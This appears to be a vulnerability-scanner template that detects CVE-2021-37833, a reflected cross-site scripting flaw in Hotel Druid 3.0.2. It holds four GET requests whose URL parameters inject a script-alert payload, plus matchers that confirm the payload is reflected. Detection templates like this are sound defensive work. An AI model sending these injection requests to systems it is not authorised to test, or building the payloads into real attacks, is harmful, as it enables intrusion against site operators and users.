id: CVE-2021-37833

info:
  name: Hotel Druid 3.0.2 XSS
  author: pikpikcu
  severity: medium
  description: reflected cross-site scripting (XSS) vulnerability exists in multiple pages in version 3.0.2 of the Hotel Druid application that allows for arbitrary execution of JavaScript commands.
  reference:
    - https://github.com/dievus/CVE-2021-37833
    - https://nvd.nist.gov/vuln/detail/CVE-2021-37833
  tags: cves,cve2021,hotel-druid,xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b"><script>alert(document.domain)</script>w5px3=1'
      - '{{BaseURL}}/storia_soldi.php?piu17"><script>alert(document.domain)</script>e3esq=1'
      - '{{BaseURL}}/tabella.php?jkuh3"><script>alert(document.domain)</script>yql8b=1'
      - '{{BaseURL}}/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ef9xkbujgt24&form_availability_calendar_template=1'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<script>alert(document.domain)</script>'
        part: body

      - type: word
        words:
          - 'Content-Type: text/html'
        part: header

      - type: status
        status:
          - 200
